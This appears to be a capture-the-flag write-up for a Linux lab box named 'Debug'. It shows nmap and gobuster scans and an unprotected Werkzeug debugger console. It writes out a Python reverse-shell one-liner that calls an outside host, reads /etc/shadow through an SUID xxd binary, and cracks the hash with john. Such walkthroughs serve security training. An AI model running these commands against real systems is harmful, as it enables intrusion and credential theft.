---
tags: [Beginner, Linux, Video]
title: Debug
created: '2020-07-03T16:52:15.246Z'
modified: '2020-10-02T17:40:48.816Z'
---

# Debug
- IP: `172.31.1.5`
- OS: `Linux`
## Enumeration
### Writeup
We find a page [console](http://172.31.1.5/console). That page shows the Werkzeug Debugger without a PIN, so we can run python commands on the server. We can get a reverse shell by entering: `import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.0.8",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);`

Our reverse shell returns and we build in some persistence by getting ssh access through our public key.

SUID is enabled on `xxd`, we can read any file with `xxd "/etc/shadow" | xxd -r`
We can then crack the hash with `john --wordlist=/usr/share/wordlists/rockyou.txt hash`
### Commands
<details>
<summary>nmap</summary>

- `nmap -p 1-65535 -T4 -A -v 172.31.1.5`
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9e:84:e4:df:52:83:55:3f:90:43:d1:8e:4a:18:8b:0c (RSA)
|   256 f6:1a:89:b2:ca:57:7a:47:be:88:9b:3e:8f:e8:52:98 (ECDSA)
|_  256 01:f2:94:0a:d3:54:52:15:87:ae:73:bc:4d:70:6e:90 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Future Design
```
</details>

<details>
<summary>Gobuster</summary>

- `gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://172.31.1.5/ -x txt -o commands/gobuster-80-root`
```
/about (Status: 200)
/blog (Status: 200)
/console (Status: 200)
/contact (Status: 200)
/server-status (Status: 403)
/services (Status: 200)
```
</details>

<details>
<summary></summary>

- ``
```

```
</details>
